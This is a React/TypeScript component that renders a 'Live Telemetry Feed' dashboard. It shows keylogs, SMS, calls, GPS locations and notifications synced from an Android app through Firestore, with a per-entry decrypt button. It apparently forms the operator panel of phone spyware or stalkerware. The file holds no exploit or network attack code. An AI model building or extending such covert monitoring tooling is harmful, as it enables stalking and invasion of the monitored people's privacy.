import type { TelemetryEntry } from '../hooks/useFirestore'
import { decryptData } from '../utils/crypto'
import { useState } from 'react'

interface TelemetryFeedProps {
  logs: TelemetryEntry[]
  loading: boolean
}

const TYPE_META: Record<TelemetryEntry['type'], { badge: string; color: string; bg: string; icon: string }> = {
  NOTIFICATION: { badge: 'NOTIF', color: '#60a5fa', bg: 'rgba(59,130,246,0.12)',  icon: '🔔' },
  KEYLOG:       { badge: 'KEYS',  color: '#f87171', bg: 'rgba(239,68,68,0.12)',   icon: '⌨' },
  SMS:          { badge: 'SMS',   color: '#4ade80', bg: 'rgba(34,197,94,0.12)',   icon: '✉' },
  CALL:         { badge: 'CALL',  color: '#c084fc', bg: 'rgba(168,85,247,0.12)', icon: '📞' },
  LOCATION:     { badge: 'GPS',   color: '#22d3ee', bg: 'rgba(6,182,212,0.12)',  icon: '📍' },
}

function timeAgo(ts: number) {
  const secs = Math.floor((Date.now() - ts) / 1000)
  if (secs < 10) return 'just now'
  if (secs < 60)   return `${secs}s ago`
  if (secs < 3600) return `${Math.floor(secs / 60)}m ago`
  return new Date(ts).toLocaleTimeString()
}

function LogRow({ log, index }: { log: TelemetryEntry; index: number }) {
  const meta = TYPE_META[log.type] ?? TYPE_META.NOTIFICATION
  const [decrypted, setDecrypted] = useState<string | null>(null)

  const handleDecrypt = async () => {
    const plain = await decryptData(log.content)
    setDecrypted(plain)
  }

  const displayContent = decrypted ?? log.content

  return (
    <div
      className="slide-in"
      style={{
        display: 'flex', gap: 12, alignItems: 'flex-start', padding: '10px 14px', borderRadius: 10,
        background: index === 0 ? meta.bg : 'rgba(255,255,255,0.02)',
        border: `1px solid ${index === 0 ? meta.color + '33' : 'rgba(255,255,255,0.04)'}`,
        transition: 'all 0.3s',
      }}
    >
      <div style={{ fontSize: 18, lineHeight: 1, marginTop: 2 }}>{meta.icon}</div>
      <div style={{ flex: 1, minWidth: 0 }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 4, flexWrap: 'wrap' }}>
          <span style={{ display: 'inline-flex', alignItems: 'center', gap: 4, padding: '2px 8px', borderRadius: 4, background: meta.bg, color: meta.color, border: `1px solid ${meta.color}44`, fontSize: 10, fontWeight: 700, letterSpacing: '0.08em', textTransform: 'uppercase' }}>
            {meta.badge}
          </span>
          {log.app && (
            <span style={{ fontSize: 11, fontWeight: 600, color: '#64748b', display: 'flex', alignItems: 'center', gap: 4 }}>
              <span style={{ color: '#334155' }}>•</span> {log.app}
            </span>
          )}
          <span style={{ fontSize: 10, color: '#334155', marginLeft: 'auto' }}>{timeAgo(log.timestamp)}</span>
          {!decrypted && (
            <button onClick={handleDecrypt} style={{ fontSize: 10, color: '#3b82f6', background: 'none', border: 'none', cursor: 'pointer', padding: 0 }}>Decrypt ↓</button>
          )}
        </div>
        <p style={{ fontSize: 13, color: '#94a3b8', lineHeight: 1.5, wordBreak: 'break-word' }}>{displayContent}</p>
      </div>
    </div>
  )
}

export default function TelemetryFeed({ logs, loading }: TelemetryFeedProps) {
  return (
    <div style={{ display: 'flex', flexDirection: 'column', height: '100%' }}>
      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 16, flexShrink: 0 }}>
        <div>
          <h2 style={{ fontSize: 16, fontWeight: 700, color: '#e2e8f0', marginBottom: 2 }}>Live Telemetry Feed</h2>
          <p style={{ fontSize: 12, color: '#475569' }}>Real-time encrypted stream · click "Decrypt" to read</p>
        </div>
        <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
          <div className="live-dot" />
          <span style={{ fontSize: 11, fontWeight: 600, color: '#22c55e' }}>{logs.length} events</span>
        </div>
      </div>

      <div style={{ flex: 1, overflowY: 'auto', display: 'flex', flexDirection: 'column', gap: 6 }}>
        {loading ? (
          Array.from({ length: 5 }).map((_, i) => (
            <div key={i} className="shimmer" style={{ height: 62, borderRadius: 10 }} />
          ))
        ) : logs.length === 0 ? (
          <div style={{ flex: 1, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', color: '#334155', textAlign: 'center', gap: 10 }}>
            <div style={{ fontSize: 40 }}>📡</div>
            <p style={{ fontSize: 14, fontWeight: 500, color: '#475569' }}>Waiting for telemetry…</p>
            <p style={{ fontSize: 12, color: '#334155' }}>Data will appear here once the Android app starts syncing to Firestore.</p>
          </div>
        ) : (
          logs.map((log, i) => <LogRow key={log.id} log={log} index={i} />)
        )}
      </div>
    </div>
  )
}
